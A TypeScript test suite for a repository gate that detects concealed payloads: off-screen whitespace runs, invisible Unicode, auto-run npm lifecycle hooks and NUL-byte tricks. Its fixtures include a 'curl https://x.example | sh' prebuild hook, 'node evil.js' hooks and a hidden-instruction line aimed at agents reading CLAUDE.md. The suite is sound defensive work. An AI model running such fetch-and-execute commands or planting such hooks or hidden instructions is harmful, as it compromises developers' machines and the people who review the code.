/**
 * Behavioural tests for scripts/check-concealment.ts — the `check:concealment`
 * gate in `bun run check`.
 *
 * Context: better-auth PR #6003 hid a loader in `demo/nextjs/postcss.config.mjs`
 * by appending it after ~800 tab characters, so the rendered diff line ended at
 * `};` and the payload sat off-screen to the right. A later commit in the same
 * PR deleted it, so the combined "Files changed / All commits" diff — the view
 * maintainers actually review from — showed only a trailing-newline change. The
 * payload never had to be merged: it only had to survive on the branch long
 * enough for CI or a maintainer's local build to run it once.
 *
 * Every payload here is built from char codes and `repeat()` rather than pasted
 * literally, because `tests/` is itself in the gate's scope — a literal
 * zero-width space in this file would trip the checker it is testing. Keep it
 * that way: this file must stay pure ASCII apart from the emoji fixture.
 *
 * Each guard gets a test that fails if that guard alone is deleted. Coverage of
 * a guard is not the same as detection of its removal (see #596): a suite that
 * only ever feeds clean input executes every branch and still passes with the
 * whole checker commented out.
 */
import { describe, expect, test } from 'bun:test';
import { mkdtemp, mkdir, rm, symlink, writeFile } from 'node:fs/promises';
import { mkdtempSync, rmSync, statSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';

const SCRIPT = fileURLToPath(new URL('../../scripts/check-concealment.ts', import.meta.url));
const REAL_ROOT = fileURLToPath(new URL('../../', import.meta.url));

/** Built from char codes so this source file stays free of the very characters it tests. */
const ZWSP = String.fromCharCode(0x200b);
const ZWJ = String.fromCharCode(0x200d);
const RLO = String.fromCharCode(0x202e);
const SHRUG = String.fromCodePoint(0x1f937);
const MALE_SIGN = String.fromCharCode(0x2642);
const VS16 = String.fromCharCode(0xfe0f);
const SOFT_HYPHEN = String.fromCharCode(0x00ad);
const NUL = String.fromCharCode(0);
/** LATIN SMALL LETTER LONG S. Folds to `s` on APFS and NTFS; JS toLowerCase leaves it alone. */
const LONG_S = String.fromCharCode(0x017f);

/**
 * Does THIS filesystem fold U+017F to `s`? APFS and NTFS do, ext4 does not.
 *
 * The routing tests below only mean anything where the fold happens: on a
 * case-sensitive filesystem `.gitattribute<U+017F>` is a genuinely different
 * file that git never reads, so asserting a finding there would assert the
 * opposite of what git does. Detected rather than assumed from the platform
 * name — a macOS user can format a case-sensitive volume, and CI is Linux.
 */
const FS_FOLDS_LONG_S = ((): boolean => {
  const probe = mkdtempSync(join(tmpdir(), 'concealment-fold-'));
  try {
    writeFileSync(join(probe, `probe${LONG_S}`), 'x');
    statSync(join(probe, 'probes'));
    return true;
  } catch {
    return false;
  } finally {
    rmSync(probe, { recursive: true, force: true });
  }
})();

/** A line carrying both a 60-space gap and an eval() — trips two rules at once. */
const concealed = `echo ok${' '.repeat(60)}eval("x")${' # '}${'x'.repeat(80)}\n`;

interface Result {
  code: number;
  stdout: string;
  stderr: string;
}

async function runCheck(
  root: string,
  args: string[] = [],
  // Deliberately applied AFTER the GIT_ filter below, so a test can put a
  // plumbing variable back to prove the gate strips it for itself.
  extraEnv: Record<string, string> = {}
): Promise<Result> {
  const proc = Bun.spawn(['bun', 'run', SCRIPT, ...args], {
    // Same reason as withGitTree's cleanEnv: a pre-push run sets GIT_DIR, and
    // leaking it makes the gate resolve to the ambient repo instead of `root`.
    env: Object.fromEntries([
      ...Object.entries(process.env).filter(([k]) => !k.startsWith('GIT_')),
      ['CHECK_CONCEALMENT_ROOT', root],
      ...Object.entries(extraEnv),
    ]) as Record<string, string>,
    stdout: 'pipe',
    stderr: 'pipe',
  });
  const [stdout, stderr] = await Promise.all([
    new Response(proc.stdout).text(),
    new Response(proc.stderr).text(),
  ]);
  return { code: await proc.exited, stdout, stderr };
}

/** Build a synthetic repo root from a path->contents map, run the gate, clean up. */
async function withTree(
  files: Record<string, string>,
  // `void` alone would silently accept an async callback and drop its
  // assertions — the test would pass no matter what it asserted.
  assertions: (result: Result) => void | Promise<void>,
  // link path -> target, written after the files so the targets exist. Used by
  // the routing test: a symlink is the only way to ask "which file does this
  // name open?" on a filesystem that does not fold case.
  links: Record<string, string> = {}
): Promise<void> {
  const dir = await mkdtemp(join(tmpdir(), 'concealment-'));
  try {
    for (const [name, contents] of Object.entries(files)) {
      const path = join(dir, name);
      await mkdir(join(path, '..'), { recursive: true });
      await writeFile(path, contents);
    }
    for (const [name, target] of Object.entries(links)) {
      const path = join(dir, name);
      await mkdir(join(path, '..'), { recursive: true });
      await symlink(target, path);
    }
    await assertions(await runCheck(dir));
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
}

const CLEAN = 'export const answer = 42;\n';

async function withGitTree(
  files: Record<string, string>,
  assertions: (result: Result) => void | Promise<void>,
  // Written AFTER the commit. `git add -A` honours .gitignore, so a file
  // listed in it at seed time is never tracked at all — which is a different
  // scenario from "tracked, then later ignored".
  afterCommit: Record<string, string> = {},
  // Built from the temp dir, because anything pointing at a file inside the
  // tree needs its absolute path.
  extraEnv: (dir: string) => Promise<Record<string, string>> | Record<string, string> = () => ({})
): Promise<void> {
  const dir = await mkdtemp(join(tmpdir(), 'concealment-git-'));
  try {
    for (const [name, contents] of Object.entries(files)) {
      const path = join(dir, name);
      await mkdir(join(path, '..'), { recursive: true });
      await writeFile(path, contents);
    }
    // Clear inherited git plumbing vars for the same reason the gate does:
    // under a pre-push hook GIT_DIR is set, and `git -C <dir>` does NOT
    // override it — `git init` here would operate on the ambient repo
    // instead of this scratch tree, and the tests would silently describe
    // the wrong repository.
    const cleanEnv: Record<string, string> = {};
    for (const [k, v] of Object.entries(process.env)) {
      if (k.startsWith('GIT_')) continue;
      if (v !== undefined) cleanEnv[k] = v;
    }
    const git = (...args: string[]): void => {
      const r = Bun.spawnSync(['git', '-C', dir, ...args], { env: cleanEnv });
      if (r.exitCode !== 0) throw new Error(`git ${args.join(' ')} failed`);
    };
    git('init', '-q');
    git('config', 'user.email', 'test@example.com');
    git('config', 'user.name', 'test');
    git('add', '-A');
    git('commit', '-qm', 'seed', '--no-gpg-sign');
    for (const [name, contents] of Object.entries(afterCommit)) {
      const path = join(dir, name);
      await mkdir(join(path, '..'), { recursive: true });
      await writeFile(path, contents);
    }
    await assertions(await runCheck(dir, [], await extraEnv(dir)));
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
}

/**
 * Put a `git` shim on PATH for one gate run, in its own temp dir OUTSIDE the
 * tree being scanned.
 *
 * Outside matters: `extraEnv` runs after the commit, so a shim written into the
 * scanned root is an untracked file inside the scope — it was the third file in
 * the untracked test's `(3 files scanned)` baseline, which is evidence quoted
 * in a docstring. Both shim tests exit at the strategy guard before the listing
 * is scanned, so it was inert, but scaffolding must not sit in the thing under
 * measurement.
 *
 * `export VAR=1` rather than an assignment prefixed to `export`: the prefixed
 * form persists only because POSIX says assignments preceding a SPECIAL
 * built-in survive it, which is true in dash and in bash-as-sh but is a
 * shell-grammar subtlety, and this suite's whole thesis is that those are where
 * bugs live. The real git path is quoted, so a path containing a space works.
 */
async function withGitShim(
  script: string,
  body: (env: Record<string, string>) => Promise<void>
): Promise<void> {
  const dir = await mkdtemp(join(tmpdir(), 'concealment-shim-'));
  try {
    await writeFile(join(dir, 'git'), script, { mode: 0o755 });
    await body({ PATH: `${dir}:${process.env.PATH ?? ''}` });
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
}

/** A shim that forwards to the real git, with `pre` inserted before the exec. */
function gitShimScript(pre: string): string {
  const realGit = Bun.which('git');
  if (realGit === null) throw new Error('git not found on PATH');
  return `#!/bin/sh\n${pre}exec "${realGit}" "$@"\n`;
}

describe('clean input', () => {
  test('passes on an ordinary source tree, and says it fell back to the walk', async () => {
    // withTree builds a plain temp directory, so the git listing declines and
    // the walk runs. Asserting the label here and `(git)` in the git block
    // below is what stops the two paths being confused for one another.
    await withTree({ 'src/a.ts': CLEAN, 'src/nested/b.ts': CLEAN }, ({ code, stdout }) => {
      expect(code).toBe(0);
      expect(stdout).toContain('check-concealment');
      expect(stdout).toContain('(walk)');
    });
  });

  test('passes on the real repository tree', async () => {
    // Regression guard: the gate must land green on this repo, or it will be
    // disabled rather than fixed the first time it blocks a merge.
    const { code, stderr } = await runCheck(REAL_ROOT);
    expect(stderr).toBe('');
    expect(code).toBe(0);
  });
});

describe('horizontal concealment', () => {
  test('flags a payload pushed off-screen by a run of spaces', async () => {
    await withTree(
      { 'src/config.ts': `};${' '.repeat(300)}globalThis.x = 1;\n` },
      ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('src/config.ts');
        expect(stderr).toContain('whitespace');
      }
    );
  });

  test('flags a run of tabs, the better-auth variant', async () => {
    await withTree(
      { 'src/config.ts': `};${'\t'.repeat(120)}globalThis.x = 1;\n` },
      ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('whitespace');
      }
    );
  });

  test('allows ordinary indentation and short alignment gaps', async () => {
    await withTree(
      { 'src/a.ts': `const x = 1;${' '.repeat(8)}// aligned trailing comment\n` },
      ({ code }) => expect(code).toBe(0)
    );
  });

  test('allows a wide gap when the line still ends on screen', async () => {
    // This repo aligns JSDoc continuations with gaps well over the run
    // threshold. Those lines are reviewable because they end where you can see
    // them, so the gap alone must not be enough to fail — otherwise the gate
    // gets switched off the first time someone formats a comment block.
    const aligned = ` *${' '.repeat(28)}falls back to the env var or the default`;
    expect(aligned.length).toBeLessThan(120);
    await withTree({ 'src/a.ts': `${aligned}\n` }, ({ code }) => expect(code).toBe(0));
  });

  test('flags an over-long line even without a whitespace run', async () => {
    await withTree({ 'src/a.ts': `const s = '${'A'.repeat(500)}';\n` }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('long line');
    });
  });

  test('ignores long lines in Markdown, which is prose and is not executed', async () => {
    await withTree({ 'docs/notes.md': `${'word '.repeat(200)}\n` }, ({ code }) =>
      expect(code).toBe(0)
    );
  });

  test('exempts generated files from the long-line rule', async () => {
    // src/core/graphql/operations.generated.ts is one string per operation and
    // runs to ~1750 columns. It is machine-written and reviewed as a whole.
    await withTree(
      { 'src/ops.generated.ts': `export const Q = '${'x'.repeat(900)}';\n` },
      ({ code }) => expect(code).toBe(0)
    );
  });

  test('still applies the whitespace rule inside generated files', async () => {
    // The long-line exemption must not become a hiding place: a gap-based
    // payload appended to a generated file is still concealment.
    await withTree(
      { 'src/ops.generated.ts': `const Q = '';${' '.repeat(200)}globalThis.x = 1;\n` },
      ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('whitespace');
      }
    );
  });
});

describe('scope', () => {
  test('skips vendored directories', async () => {
    await withTree({ 'node_modules/pkg/index.js': `eval(x);\n` }, ({ code }) =>
      expect(code).toBe(0)
    );
  });

  test('skips binary files rather than reporting noise from them', async () => {
    // A NUL byte marks it binary; the soft hyphens after it would otherwise be
    // reported as invisible characters on every line.
    //
    // The path changed from src/blob.json to an actual binary extension when
    // the NUL free-pass was closed (Fable review): a NUL in a .json is no
    // longer "binary, therefore skip" — it is now a finding, because such a
    // file still parses and executes while git shows the reviewer nothing.
    // Quiet-skipping is now scoped to extensions where a NUL is expected.
    const binary = `PK${NUL}${NUL}${SOFT_HYPHEN.repeat(50)}`;
    await withTree({ 'docs/blob.png': binary }, ({ code }) => expect(code).toBe(0));
  });

  test('skips lockfiles, which are generated and covered by check:deps-pinned', async () => {
    await withTree({ 'package-lock.json': `{"x":"${'A'.repeat(600)}"}\n` }, ({ code }) =>
      expect(code).toBe(0)
    );
  });
});

// Regression cover for the two allowlist holes found by the 2026-08-29
// completeness-guard audit (docs/audits/2026-08-29-completeness-guard-audit.md
// F1 and F2). Both were the same defect this gate exists to catch: the gate
// enumerated what to CHECK instead of what to SKIP, so anything it had not
// predicted was invisible.
/**
 * The gate lists files from git when it can, falling back to a filesystem walk
 * outside a repo. Every other test in this file drives the FALLBACK, because
 * withTree builds a plain temp directory — so without this block the path that
 * actually runs in production would be untested, which is the same shape of
 * hole the audit that prompted these tests was about.
 */
describe('file list comes from git when available (review follow-up)', () => {
  test('the summary line says which strategy listed the files', async () => {
    // The fallback was silent: git missing, a dubious-ownership refusal or a
    // toplevel mismatch all dropped the gate onto the walk, which does not
    // honour .gitignore and does honour SKIP_DIRS for tracked files — a
    // materially different scanned set, reported with the same green line.
    // Every withGitTree test used to infer the git path indirectly, from
    // behaviour that only differs on the git path.
    await withGitTree({ 'src/a.ts': CLEAN }, ({ code, stdout }) => {
      expect(code).toBe(0);
      expect(stdout).toContain('(git)');
    });
  });

  test('a tree with a .git that git will not list is refused, not quietly walked', async () => {
    // The label made the swap visible; nobody reads a green step. gitFiles
    // drops HOME, so a global safe.directory is invisible to it and a repo
    // owned by another uid makes git refuse — plausible in a container job.
    // Every refusal lands on the same `run() === undefined` path.
    //
    // `.git` here holds a garbage config, which is a real refusal from real
    // git: `git -C <dir> rev-parse --show-toplevel` answers `fatal: not a git
    // repository` with status 128. `chmod 000 .git` on a valid repo does the
    // same thing; both were run against git 2.50.1. The motivating refusal —
    // dubious ownership — gets its own test below, which does not need the
    // second uid an earlier round assumed it did.
    await withTree(
      { '.git/config': 'garbage\n', 'build/loader.ts': concealed, 'src/a.ts': CLEAN },
      ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('the git listing declined');
        // git's own words again, not the gate's guess about them.
        expect(stderr).toContain('not a git repository');
      }
    );
  });

  test('git missing from PATH is reported as ENOENT, not as a refusal', async () => {
    // The third cause folded into one `undefined`, and the one where guessing
    // does most harm: the old message told the operator to run a git command to
    // see the refusal, and here git does not exist to be run.
    //
    // It reaches the guard through r.error rather than r.status, which is a
    // branch nothing else in this suite executes — and the two runtimes
    // disagree on the rest of the result, which is why the branch keys on
    // error.code. Measured: for a missing binary node answers status=null with
    // stdout undefined, bun answers status=undefined with stdout an object.
    // Both answer error.code === 'ENOENT'.
    // A PATH holding bun and nothing else. Not an EMPTY PATH: runCheck spawns
    // the gate with `bun`, so emptying PATH breaks the harness rather than the
    // thing under test — which it did, on the first attempt.
    const onlyBun = await mkdtemp(join(tmpdir(), 'concealment-nogit-'));
    try {
      await symlink(process.execPath, join(onlyBun, 'bun'));
      expect(Bun.which('git', { PATH: onlyBun })).toBeNull();
      await withGitTree(
        { 'build/loader.ts': concealed, 'src/a.ts': CLEAN },
        ({ code, stderr }) => {
          expect(code).toBe(1);
          expect(stderr).toContain('the git listing declined');
          expect(stderr).toContain('ENOENT');
          expect(stderr).toContain('not on PATH');
        },
        {},
        () => ({ PATH: onlyBun })
      );
    } finally {
      await rm(onlyBun, { recursive: true, force: true });
    }
  });

  test('a real dubious-ownership refusal is refused, not walked', async () => {
    // The scenario the guard exists for, driven end-to-end at last. An earlier
    // round recorded it as unrunnable without a second uid; that was wrong.
    // git ships GIT_TEST_ASSUME_DIFFERENT_OWNER, which makes
    // ensure_valid_ownership take the failing branch and emit the genuine
    // `fatal: detected dubious ownership in repository at '<path>'`, status 128
    // — no chown, no sudo, no container.
    //
    // It has to arrive on a PATH shim rather than in the environment, because
    // gitFiles strips the whole GIT_ namespace before spawning — the same
    // stripping that makes this failure mode terminal in the first place.
    //
    // Non-vacuous, measured on this tree against the pre-guard file: it printed
    // `1 files scanned (walk), nothing hidden` and exited 0, the tracked
    // concealed build/loader.ts having been dropped by SKIP_DIRS on the walk.
    // The assertion is on git's OWN words. `dubious ownership` is a string this
    // suite never writes: it can only appear in the output by having been
    // captured from the failing git's stderr and threaded out of gitFiles, so
    // it pins both the guard and the cause reporting at once.
    const script = gitShimScript('export GIT_TEST_ASSUME_DIFFERENT_OWNER=1\n');
    await withGitShim(script, async (env) => {
      await withGitTree(
        { 'build/loader.ts': concealed, 'src/a.ts': CLEAN },
        ({ code, stderr }) => {
          expect(code).toBe(1);
          expect(stderr).toContain('the git listing declined');
          expect(stderr).toContain('dubious ownership');
        },
        {},
        () => env
      );
    });
  });

  test('the control: without the .git the walk runs, and it misses the payload', async () => {
    // What the guard above is worth, and why it is not simply noise. The
    // identical tree minus `.git` is a legitimate non-repo, the walk is the
    // right listing for it — and the walk applies SKIP_DIRS to `build/`, so the
    // concealed file is not scanned at all and the run is green over ONE file.
    //
    // That is the shrink, measured on this exact pair of trees with the
    // label-only version of the gate: committed to a real repo it reports
    // `(2 files scanned, listed by git)` and exits 1; after `chmod 000 .git` it
    // reports `1 files scanned (walk), nothing hidden` and exits 0. A `.git`
    // present alongside a walk listing means that difference is being taken
    // silently, which is what the test above now refuses.
    await withTree({ 'build/loader.ts': concealed, 'src/a.ts': CLEAN }, ({ code, stdout }) => {
      expect(code).toBe(0);
      expect(stdout).toContain('(walk)');
      expect(stdout).toContain('1 files scanned');
    });
  });

  test('a failed untracked listing refuses, instead of scanning the tracked half', async () => {
    // The last silent scan-shrink, and the one the strategy guard above cannot
    // see: `?? []` on the untracked listing kept `strategy` at 'git', so a
    // failure printed `N files scanned (git), nothing hidden` over a scope that
    // had lost its whole untracked half.
    //
    // No tree state makes `ls-files --others` exit non-zero — looked for, on
    // git 2.50.1: an unreadable subdirectory warns and exits 0, an unreadable
    // .git/info/exclude warns and exits 0, a .gitignore that is a DIRECTORY is
    // silent and exits 0. So the failure is injected where run() actually
    // observes it, at the process boundary: a `git` earlier on PATH that exits
    // 1 on `--others` and execs the real git for everything else. run() cannot
    // tell why git failed, only that it did, which is the whole point.
    //
    // Measured against the pre-fix code over this tree: real git reports
    // `(2 files scanned, listed by git)` and exits 1; the shim reports
    // `1 files scanned (git), nothing hidden` and exits 0.
    //
    // The assertion names the failing argv, which is the point of threading the
    // cause out of gitFiles: `--others` is the invocation that actually died,
    // and the operator gets that rather than a guess.
    const script = gitShimScript(
      'for a in "$@"; do\n  if [ "$a" = "--others" ]; then exit 1; fi\ndone\n'
    );
    await withGitShim(script, async (env) => {
      await withGitTree(
        { 'src/a.ts': 'const a = 1;\n' },
        ({ code, stderr }) => {
          expect(code).toBe(1);
          expect(stderr).toContain('the git listing declined');
          expect(stderr).toContain('Cause:');
          expect(stderr).toContain('--others');
        },
        { 'src/added-later.ts': concealed },
        () => env
      );
    });
  });

  test('a listing past the spawnSync default is scanned, not declined', async () => {
    // spawnSync's maxBuffer defaults to 1 MiB and is not a truncation — it
    // KILLS the child. Unset, a large enough repo makes every `git` call in
    // this gate fail, and since #698 a failed call is a hard exit 1: the gate
    // would refuse to run on exactly the repositories most worth scanning.
    //
    // 2,500 deeply-nested paths give a ~2.3 MiB listing, which is past the
    // point where the child is actually signalled. Measured on bun 1.3.5, and
    // the shape depends on the size: at ~1.05 MiB git exits first, so status is
    // 0 with error ENOBUFS and the output happened to be complete; at ~2.3 MiB
    // and ~4.6 MiB the child is SIGTERMed with status null. run() keys on
    // r.error rather than r.status precisely because the first shape is a race
    // whose outcome is incidental — not a case of accepted truncation I was
    // able to produce, but not one worth depending on either.
    //
    // Non-vacuous: with `maxBuffer` removed this same tree makes the gate print
    // `Cause: ... produced more than the ... bytes this gate allows` and exit 1.
    const dir = await mkdtemp(join(tmpdir(), 'concealment-big-'));
    try {
      const deep = join(dir, ...Array.from({ length: 9 }, (_, i) => `d${i}`.padEnd(100, 'x')));
      await mkdir(deep, { recursive: true });
      await Promise.all(
        Array.from({ length: 2500 }, (_, i) =>
          writeFile(join(deep, `f${String(i).padStart(5, '0')}.ts`), CLEAN)
        )
      );
      const cleanEnv: Record<string, string> = {};
      for (const [k, v] of Object.entries(process.env)) {
        if (!k.startsWith('GIT_') && v !== undefined) cleanEnv[k] = v;
      }
      for (const args of [
        ['init', '-q'],
        ['add', '-A'],
        ['-c', 'user.email=t@e.com', '-c', 'user.name=t', 'commit', '-qm', 'seed', '--no-gpg-sign'],
      ]) {
        const r = Bun.spawnSync(['git', '-C', dir, ...args], { env: cleanEnv });
        if (r.exitCode !== 0) throw new Error(`git ${args.join(' ')} failed`);
      }
      const { code, stdout } = await runCheck(dir);
      expect(code).toBe(0);
      expect(stdout).toContain('(git)');
      expect(stdout).toContain('2500 files scanned');
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test('a repo with nothing untracked still scans, and still reports (git)', async () => {
    // The other half of the same distinction, and the regression the fix above
    // could have introduced. Empty is not failure: probed on git 2.50.1, a
    // clean tree gives `ls-files --others --exclude-standard` status 0 with
    // zero bytes of stdout, which run() turns into `[]`. Treating a falsy or
    // empty listing as a refusal would fail this gate on every clean checkout.
    await withGitTree({ 'src/a.ts': CLEAN }, ({ code, stdout }) => {
      expect(code).toBe(0);
      expect(stdout).toContain('(git)');
      expect(stdout).toContain('1 files scanned');
    });
  });

  test('an inherited GIT_CONFIG_GLOBAL cannot shrink the scanned set', async () => {
    // GIT_DIR is not the only plumbing variable that reaches into the listing.
    // GIT_CONFIG_GLOBAL (and GIT_CONFIG_COUNT/KEY/VALUE) can set
    // core.excludesFile, which `ls-files --others --exclude-standard` honours —
    // so an ambient value silently drops files from the scan while the gate
    // still prints a green line. Stripping seven variables BY NAME was the same
    // shape of bug this gate exists to catch: an enumeration of what to handle,
    // with everything unlisted falling through.
    await withGitTree(
      { 'src/a.ts': CLEAN },
      ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('added-later');
      },
      { 'src/added-later.ts': concealed },
      async (dir) => {
        const excludes = join(dir, 'excludes');
        const config = join(dir, 'gitconfig');
        await writeFile(excludes, '*.ts\n');
        await writeFile(config, `[core]\n\texcludesFile = ${excludes}\n`);
        return { GIT_CONFIG_GLOBAL: config };
      }
    );
  });

  test('a HOME-supplied core.excludesFile cannot shrink the scanned set either', async () => {
    // Stripping GIT_* closed one door and left the other open. `ls-files
    // --exclude-standard` reads core.excludesFile from the GLOBAL config, which
    // git finds through HOME (or XDG_CONFIG_HOME) with no GIT_ variable
    // involved at all — so the ambient user config still silently dropped files
    // from the scan under the same green line. The environment is not trusted
    // for this; git is told to read no config files.
    await withGitTree(
      { 'src/a.ts': CLEAN },
      ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('added-later');
      },
      { 'src/added-later.ts': concealed },
      async (dir) => {
        const home = join(dir, 'home');
        await mkdir(home, { recursive: true });
        const excludes = join(home, 'excludes');
        await writeFile(excludes, '*.ts\n');
        await writeFile(join(home, '.gitconfig'), `[core]\n\texcludesFile = ${excludes}\n`);
        return { HOME: home, XDG_CONFIG_HOME: home };
      }
    );
  });

  test('a gitignored tree is not scanned', async () => {
    // The real exposure: removing the extension allowlist put snapshots/,
    // local fixture databases and .env.local in scope on developer machines.
    // Decoding a multi-hundred-MB LevelDB blob to a string before the NUL
    // check discards it is wasteful, and a long JWT line in .env.local would
    // fail the gate with a finding no PR could resolve.
    await withGitTree(
      { '.gitignore': 'secrets/\n', 'src/a.ts': 'const a = 1;\n', 'secrets/blob.ts': concealed },
      ({ code }) => expect(code).toBe(0)
    );
  });

  test('a tracked file is still scanned, and the failing run names the strategy', async () => {
    // The label used to print only on the green path — which is the run where
    // you least need it. A failing run is exactly when "which set was scanned?"
    // is the first question.
    await withGitTree({ 'src/a.ts': concealed }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('src/a.ts');
      expect(stderr).toContain('listed by git');
    });
  });

  test('an untracked but unignored file is scanned — it can still reach a diff', async () => {
    // `added-later.ts` MUST go through afterCommit. Writing it in the `files`
    // map put it in the seed commit, so it was tracked — and the test passed
    // even with the untracked listing removed entirely. It executed the guard
    // without detecting anything, which is the vacuous-assertion class this
    // repo names explicitly. Caught in review, not by the suite.
    await withGitTree(
      { 'src/a.ts': 'const a = 1;\n' },
      ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('added-later');
      },
      { 'src/added-later.ts': concealed }
    );
  });

  test('gitignoring an already-tracked file does not hide it', async () => {
    // The property that makes this not an allowlist: .gitignore cannot be used
    // to evade the gate, because ignoring a committed file does not untrack it.
    await withGitTree(
      { 'src/a.ts': concealed },
      ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('src/a.ts');
      },
      { '.gitignore': 'src/a.ts\n' }
    );
  });
});

describe('scope is not an extension allowlist (audit F2)', () => {
  test('scans a file with no extension at all', async () => {
    // The live exposure was .husky/pre-push, which runs on every developer
    // push. Under the old SCOPED_EXTENSIONS allowlist, inScope() required a
    // dot, so an extensionless file was never opened.
    await withTree({ 'scripts/pre-push': concealed }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('pre-push');
    });
  });

  test('scans an extension nobody thought to allowlist', async () => {
    await withTree({ 'scripts/probe.rb': concealed }, ({ code }) => expect(code).toBe(1));
  });

  test('prose keeps the invisible-character rule', async () => {
    // Relaxing prose must not relax it into a blind spot: a zero-width
    // character in a README is never benign.
    await withTree({ 'README.md': `Hello${ZWSP} world\n` }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('U+200B');
    });
  });

  test('a whitespace-run payload in markdown is reported', async () => {
    // Prose loses the long-line and dynamic-execution rules, not this one.
    // Markdown here is not only read by humans: CLAUDE.md and skills/**/*.md
    // are instruction files an agent reads in full, so a gap that pushes an
    // instruction off the right edge of the diff is concealment in exactly the
    // sense this gate means — invisible to the reviewer, load-bearing to the
    // reader. Markdown's one legitimate whitespace idiom, the trailing double
    // space that forces a line break, sits at end-of-line and cannot match
    // \S[gap]{20,}\S.
    //
    // The fixture must clear CONCEALED_LINE (120) as well as carry the gap:
    // the rule is a conjunction, so a short line with a wide gap passes both
    // before and after this change and would pin nothing.
    const line = `${'real prose. '.repeat(8)}${' '.repeat(40)}then a hidden instruction`;
    await withTree({ 'CLAUDE.md': `${line}\n` }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('CLAUDE.md');
      // The rule, not just the exit code: without this the test passes if any
      // other rule happens to fire on the fixture.
      expect(stderr).toContain('whitespace run');
    });
  });

  test('a LEADING-gap payload in markdown is reported', async () => {
    // The bound the mid-line form left open. `\S[gap]{20,}\S` needs a non-space
    // on the LEFT, so a line that opens with the gap matched nothing — and
    // prose is exempt from MAX_LINE, so nothing else caught it either. An
    // instruction sitting at column 200 of a 232-column line renders as a blank
    // line to a reviewer scrolling a diff and as an instruction to the model.
    const line = `${' '.repeat(200)}then a hidden instruction, invisible above`;
    await withTree({ 'CLAUDE.md': `${line}\n` }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('whitespace run');
    });
  });

  test('ordinary indentation is not a leading gap', async () => {
    // The measurement behind the threshold: across the whole repo, the deepest
    // leading whitespace on any line over 120 columns is 14, and the longest
    // line carrying 20+ leading gap characters is 95 columns. Both axes of the
    // conjunction have real margin, which is why this can be a rule rather than
    // an exemption list.
    await withTree(
      { 'src/deep.ts': `${' '.repeat(14)}const x = '${'y'.repeat(110)}';\n` },
      ({ code }) => expect(code).toBe(0)
    );
  });

  test('a deep LEADING gap on a short line is allowed', async () => {
    // Axis 2 of the conjunction, pinned directly rather than inferred from the
    // mid-line case, and pinned ABOVE both of the repo's real extremes rather
    // than between them: the deepest leading gap is 37 characters
    // (docs/bulk-edit-transactions.md:235) and the longest line carrying a 20+
    // gap is 95 columns (docs/REVERSE_ENGINEERING_FINDING.md:611). This fixture
    // is 45 characters of gap on a 115-column line — deeper AND longer than
    // anything real — and must still be quiet, because it is the line-length
    // half of the conjunction that makes it safe, not the shallowness.
    const line = `${' '.repeat(45)}${'x'.repeat(70)}`;
    await withTree({ 'docs/indented.md': `${line}\n` }, ({ code }) => expect(code).toBe(0));
  });

  test('a wide gap in markdown that still ends on screen is allowed', async () => {
    // The other half of the conjunction, kept honest: an aligned two-column
    // list in a README is legible precisely because the line ends where you
    // can see it. Without this, someone could "fix" a false positive by
    // dropping CONCEALED_LINE and no test would notice.
    await withTree({ 'docs/table.md': `col${' '.repeat(30)}value\n` }, ({ code }) =>
      expect(code).toBe(0)
    );
  });

  test('prose is exempt from the long-line and dynamic-execution rules', async () => {
    // A long paragraph in a CHANGELOG is a paragraph, and a doc that quotes
    // eval() is documentation. Markdown is not executed. Exactly two rules are
    // dropped for prose — the whitespace run is NOT one of them, see above.
    await withTree({ 'CHANGELOG.md': `${'word '.repeat(200)}eval(x)\n` }, ({ code }) =>
      expect(code).toBe(0)
    );
  });
});

describe('auto-fired lifecycle scripts (audit F1)', () => {
  test('flags prepack, which runs during npm publish', async () => {
    // The finding: prepack was absent from the old four-name FORBIDDEN_LIFECYCLE
    // list, and npm runs it inside the publish job that holds id-token: write.
    const pkg = JSON.stringify({ scripts: { prepack: 'node evil.js' } });
    await withTree({ 'package.json': pkg }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('prepack');
    });
  });

  test.each(['postpack', 'dependencies', 'preversion', 'postpublish', 'preuninstall'])(
    'flags %s',
    async (hook) => {
      const pkg = JSON.stringify({ scripts: { [hook]: 'node evil.js' } });
      await withTree({ 'package.json': pkg }, ({ code }) => expect(code).toBe(1));
    }
  );

  test('flags a pre/post wrapper around an existing script', async () => {
    // The general form: npm auto-runs preX/postX around any script X, so a
    // wrapper fires implicitly even though its own name is not a lifecycle hook.
    const pkg = JSON.stringify({
      scripts: { build: 'tsc', prebuild: 'curl https://x.example | sh' },
    });
    await withTree({ 'package.json': pkg }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('prebuild');
    });
  });

  test('does not flag an explicitly-invoked script that shares a lifecycle name', async () => {
    // `test` only runs when you type it. This repo defines it; refusing it
    // would make the gate unusable, which is how allowlists get widened.
    const pkg = JSON.stringify({ scripts: { test: 'bun test', build: 'tsc' } });
    await withTree({ 'package.json': pkg }, ({ code }) => expect(code).toBe(0));
  });
});

describe('a NUL byte is not a free pass (Fable review)', () => {
  test('a NUL in a source file is reported, not skipped as binary', async () => {
    // The bypass: `contents.includes(NUL) -> continue` treated NUL-containing
    // as binary-and-therefore-safe. But such a module still runs under bun and
    // node, while git renders it as "Binary files differ" so the reviewer sees
